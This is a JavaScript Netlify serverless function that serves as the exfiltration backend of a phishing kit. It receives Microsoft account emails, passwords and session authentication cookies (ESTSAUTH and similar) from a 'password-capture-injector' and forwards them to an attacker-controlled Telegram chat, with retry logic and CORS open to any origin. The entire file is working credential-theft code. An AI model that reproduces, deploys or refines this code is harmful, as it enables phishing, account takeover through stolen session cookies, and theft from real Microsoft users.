/**
 * ENHANCED Telegram Bot Function for Netlify
 * Handles credential and cookie data transmission with comprehensive error handling
 * Synchronized with password-capture-injector.ts, App.tsx, and RealOAuthRedirect.tsx
 */

const https = require('https');

// FIXED: Enhanced Telegram configuration with better error handling
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// FIXED: Enhanced validation function
function validateTelegramConfig() {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error('TELEGRAM_BOT_TOKEN environment variable is required');
  }
  if (!TELEGRAM_CHAT_ID) {
    throw new Error('TELEGRAM_CHAT_ID environment variable is required');
  }
  return true;
}

// FIXED: Enhanced message formatting with better structure matching injector expectations
function formatTelegramMessage(data) {
  const {
    email = '',
    password = '',
    passwordSource = 'unknown',
    cookies = [],
    authenticationTokens = null,
    userAgent = '',
    sessionId = '',
    url = '',
    timestamp = '',
    validated = false,
    microsoftAccount = false,
    domain = '',
    rawCookies = '',
    captureContext = {},
    browserCapabilities = {},
    retryAttempt = 0
  } = data;

  // FIXED: Enhanced message structure matching the injector expectations
  let message = '🔐 *Microsoft Account Credentials Captured*\n\n';
  
  // Credential information
  if (email) {
    message += `📧 *Email:* \`${email}\`\n`;
  }
  if (password) {
    message += `🔑 *Password:* \`${password}\`\n`;
  }
  
  // Validation status
  message += `✅ *Validated:* ${validated ? 'Yes' : 'No'}\n`;
  message += `🏢 *Microsoft Account:* ${microsoftAccount ? 'Yes' : 'No'}\n`;
  
  // Source information
  message += `📍 *Source:* ${passwordSource}\n`;
  if (domain) {
    message += `🌐 *Domain:* ${domain}\n`;
  }
  
  // Cookie information
  if (cookies && cookies.length > 0) {
    message += `🍪 *Cookies:* ${cookies.length} captured\n`;
    
    // Show important Microsoft cookies
    const importantCookies = cookies.filter(cookie => 
      cookie.name && (
        cookie.name.includes('ESTSAUTH') ||
        cookie.name.includes('SignInStateCookie') ||
        cookie.name.includes('ESTSAUTHPERSISTENT') ||
        cookie.name.includes('ESTSAUTHLIGHT')
      )
    );
    
    if (importantCookies.length > 0) {
      message += `🎯 *Auth Cookies:* ${importantCookies.length} found\n`;
    }
  }
  
  // Browser and technical information
  if (browserCapabilities && browserCapabilities.browser) {
    message += `🌐 *Browser:* ${browserCapabilities.browser} v${browserCapabilities.version}\n`;
  }
  
  if (userAgent) {
    message += `📱 *User Agent:* \`${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}\`\n`;
  }
  
  // Capture context (for debugging)
  if (captureContext && Object.keys(captureContext).length > 0) {
    message += '\n📊 *Capture Details:*\n';
    if (captureContext.hostname) {
      message += `• Hostname: ${captureContext.hostname}\n`;
    }
    if (captureContext.hasStoredCredentials !== undefined) {
      message += `• Stored Credentials: ${captureContext.hasStoredCredentials ? 'Yes' : 'No'}\n`;
    }
    if (captureContext.injectorVersion) {
      message += `• Injector Version: ${captureContext.injectorVersion}\n`;
    }
    if (retryAttempt > 0) {
      message += `• Retry Attempt: ${retryAttempt + 1}\n`;
    }
  }
  
  // Timestamp and session
  message += `\n⏰ *Timestamp:* ${timestamp || new Date().toISOString()}\n`;
  if (sessionId) {
    message += `🔗 *Session ID:* \`${sessionId}\`\n`;
  }
  if (url) {
    message += `🔗 *URL:* ${url}\n`;
  }
  
  return message;
}

// FIXED: Enhanced cookie details formatting
function formatCookieDetails(cookies) {
  if (!cookies || cookies.length === 0) {
    return 'No cookies captured';
  }
  
  let cookieMessage = `🍪 *Cookie Details (${cookies.length} total):*\n\n`;
  
  // Group cookies by importance
  const authCookies = [];
  const sessionCookies = [];
  const otherCookies = [];
  
  cookies.forEach(cookie => {
    if (!cookie.name) return;
    
    if (cookie.name.includes('ESTSAUTH') || 
        cookie.name.includes('SignInStateCookie') ||
        cookie.name.includes('ESTSAUTHPERSISTENT') ||
        cookie.name.includes('ESTSAUTHLIGHT')) {
      authCookies.push(cookie);
    } else if (cookie.name.includes('session') || 
               cookie.name.includes('Session') ||
               cookie.name.includes('SESS')) {
      sessionCookies.push(cookie);
    } else {
      otherCookies.push(cookie);
    }
  });
  
  // Format auth cookies (most important)
  if (authCookies.length > 0) {
    cookieMessage += '🎯 *Authentication Cookies:*\n';
    authCookies.forEach(cookie => {
      cookieMessage += `• \`${cookie.name}\`: ${cookie.value ? cookie.value.substring(0, 50) + '...' : 'empty'}\n`;
      if (cookie.domain) cookieMessage += `  Domain: ${cookie.domain}\n`;
      if (cookie.secure) cookieMessage += `  Secure: Yes\n`;
    });
    cookieMessage += '\n';
  }
  
  // Format session cookies
  if (sessionCookies.length > 0) {
    cookieMessage += '🔗 *Session Cookies:*\n';
    sessionCookies.slice(0, 5).forEach(cookie => { // Limit to first 5
      cookieMessage += `• \`${cookie.name}\`: ${cookie.value ? cookie.value.substring(0, 30) + '...' : 'empty'}\n`;
    });
    if (sessionCookies.length > 5) {
      cookieMessage += `• ... and ${sessionCookies.length - 5} more session cookies\n`;
    }
    cookieMessage += '\n';
  }
  
  // Format other cookies (summary only)
  if (otherCookies.length > 0) {
    cookieMessage += `📋 *Other Cookies:* ${otherCookies.length} additional cookies captured\n`;
  }
  
  return cookieMessage;
}

// FIXED: Enhanced Telegram API call with better error handling and retry logic
async function sendToTelegram(message, retryCount = 0) {
  const maxRetries = 3;
  
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown',
      disable_web_page_preview: true
    });

    const options = {
      hostname: 'api.telegram.org',
      port: 443,
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 10000 // 10 second timeout
    };

    const req = https.request(options, (res) => {
      let data = '';
      
      res.on('data', (chunk) => {
        data += chunk;
      });
      
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          
          if (res.statusCode === 200 && response.ok) {
            console.log('✅ Message sent to Telegram successfully');
            resolve(response);
          } else {
            console.error('❌ Telegram API error:', response);
            
            // Retry on server errors
            if (res.statusCode >= 500 && retryCount < maxRetries) {
              console.log(`🔄 Server error, retrying in ${(retryCount + 1) * 1000}ms...`);
              setTimeout(() => {
                sendToTelegram(message, retryCount + 1)
                  .then(resolve)
                  .catch(reject);
              }, (retryCount + 1) * 1000);
            } else {
              reject(new Error(`Telegram API error: ${response.description || 'Unknown error'}`));
            }
          }
        } catch (parseError) {
          console.error('❌ Failed to parse Telegram response:', parseError);
          reject(new Error('Invalid response from Telegram API'));
        }
      });
    });

    req.on('error', (error) => {
      console.error('❌ Request error:', error);
      
      // Retry on network errors
      if (retryCount < maxRetries) {
        console.log(`🔄 Network error, retrying in ${(retryCount + 1) * 2000}ms...`);
        setTimeout(() => {
          sendToTelegram(message, retryCount + 1)
            .then(resolve)
            .catch(reject);
        }, (retryCount + 1) * 2000);
      } else {
        reject(error);
      }
    });

    req.on('timeout', () => {
      req.destroy();
      const timeoutError = new Error('Request timeout');
      
      // Retry on timeout
      if (retryCount < maxRetries) {
        console.log(`🔄 Timeout, retrying in ${(retryCount + 1) * 2000}ms...`);
        setTimeout(() => {
          sendToTelegram(message, retryCount + 1)
            .then(resolve)
            .catch(reject);
        }, (retryCount + 1) * 2000);
      } else {
        reject(timeoutError);
      }
    });

    req.write(postData);
    req.end();
  });
}

// FIXED: Main handler function with comprehensive error handling
exports.handler = async (event, context) => {
  // Set CORS headers for all responses
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type, Accept',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ message: 'CORS preflight successful' })
    };
  }

  // Only allow POST requests
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ 
        error: 'Method not allowed',
        message: 'Only POST requests are accepted'
      })
    };
  }

  try {
    // Validate Telegram configuration
    validateTelegramConfig();

    // Parse request body
    let requestData;
    try {
      requestData = JSON.parse(event.body || '{}');
    } catch (parseError) {
      console.error('❌ Failed to parse request body:', parseError);
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'Invalid JSON',
          message: 'Request body must be valid JSON'
        })
      };
    }

    // FIXED: Enhanced data validation matching injector expectations
    const {
      email,
      password,
      passwordSource = 'unknown',
      cookies = [],
      authenticationTokens,
      userAgent,
      sessionId,
      url,
      timestamp,
      validated = false,
      microsoftAccount = false,
      domain,
      rawCookies,
      captureContext = {},
      browserCapabilities = {},
      retryAttempt = 0
    } = requestData;

    // Validate that we have meaningful data to send
    if (!email && !password && (!cookies || cookies.length === 0)) {
      console.warn('⚠️ No meaningful data provided');
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          error: 'No data provided',
          message: 'At least email, password, or cookies must be provided'
        })
      };
    }

    console.log('📨 Processing Telegram message with data:', {
      hasEmail: !!email,
      hasPassword: !!password,
      cookieCount: cookies.length,
      source: passwordSource,
      validated,
      microsoftAccount,
      retryAttempt
    });

    // Format and send main message
    const mainMessage = formatTelegramMessage(requestData);
    await sendToTelegram(mainMessage);

    // Send cookie details as separate message if we have cookies
    if (cookies && cookies.length > 0) {
      try {
        const cookieMessage = formatCookieDetails(cookies);
        await sendToTelegram(cookieMessage);
        console.log('✅ Cookie details sent successfully');
      } catch (cookieError) {
        console.warn('⚠️ Failed to send cookie details:', cookieError.message);
        // Don't fail the main request if cookie details fail
      }
    }

    // Success response
    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ 
        success: true,
        message: 'Data sent to Telegram successfully',
        timestamp: new Date().toISOString(),
        dataProcessed: {
          email: !!email,
          password: !!password,
          cookies: cookies.length,
          validated,
          microsoftAccount
        }
      })
    };

  } catch (error) {
    console.error('❌ Handler error:', error);
    
    // Return appropriate error response
    const isConfigError = error.message.includes('environment variable');
    const statusCode = isConfigError ? 500 : 400;
    
    return {
      statusCode,
      headers,
      body: JSON.stringify({ 
        error: 'Processing failed',
        message: isConfigError ? 'Server configuration error' : error.message,
        timestamp: new Date().toISOString()
      })
    };
  }
};
